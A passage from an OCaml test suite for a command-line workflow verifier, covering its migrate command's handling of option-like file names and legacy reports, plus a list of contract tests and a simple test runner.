    | Error _ -> false);
  state.files <- ("--legacy.lock", legacy_lock) :: state.files;
  state.stdout <- [];
  let separator_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "migrate"; "--"; "--legacy.lock" |]
  in
  expect "the standard -- separator permits option-like file names"
    (separator_code = 0);
  state.files <-
    ("old-report.json", "{\"schema\":\"report-v1\",\"diagnostics\":[]}")
    :: state.files;
  state.stdout <- [];
  state.stderr <- [];
  let report_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "migrate"; "old-report.json" |]
  in
  expect "legacy reports are never reinterpreted as v2"
    (report_code = 2
    && Util.contains ~needle:"not migratable" (output state.stderr))

let tests : test list =
  [
    ("help exposes the complete stable command surface", help_surface_test);
    ("subcommand help is specific and side-effect free", subcommand_help_test);
    ( "strict arguments fail before side effects and -- is supported",
      strict_argument_parser_test );
    ("check obeys gate report and read-only defaults", check_contract_test);
    ("discovery excludes generated trees", discovery_boundary_test);
    ( "trusted source exclusions are manifest-bound",
      trusted_source_exclusion_test );
    ( "network write and execution require separate opt-ins",
      explicit_effects_test );
    ( "exit codes distinguish input incomplete and infrastructure",
      strict_and_error_codes_test );
    ("explain graph and doctor expose evidence", explain_graph_doctor_test);
    ( "sandbox replay and audit authenticate persisted evidence",
      sandbox_replay_audit_test );
    ("policy test executes expectation fixtures", policy_fixture_test);
    ("check uses an opt-in content-addressed cache", incremental_cache_cli_test);
    ( "sandbox plan hashes the complete mounted source tree",
      sandbox_source_manifest_test );
    ( "sandbox audit reconciles static and runtime effects",
      sandbox_reconciliation_cli_test );
    ( "macOS VM requests exactly the controls it attests",
      macos_vm_control_contract_test );
    ( "file targets place the default lock beside the source",
      file_target_lock_path_contract_test );
    ( "CLI recursively links local workspace units",
      local_workspace_linking_cli_test );
    ( "migrate validates config-v1 and lock-v1 without reinterpreting reports",
      migration_contract_test );
  ]

let () =
  let failures = ref 0 in
  List.iter
    (fun (name, run) ->
      try
        run ();
        Printf.printf "ok - %s\n%!" name
      with
      | Failed message ->
          incr failures;
          Printf.eprintf "not ok - %s: %s\n%!" name message
      | error ->
          incr failures;
          Printf.eprintf "not ok - %s: unexpected %s\n%!" name
            (Printexc.to_string error))
    tests;
  if !failures > 0 then exit 1
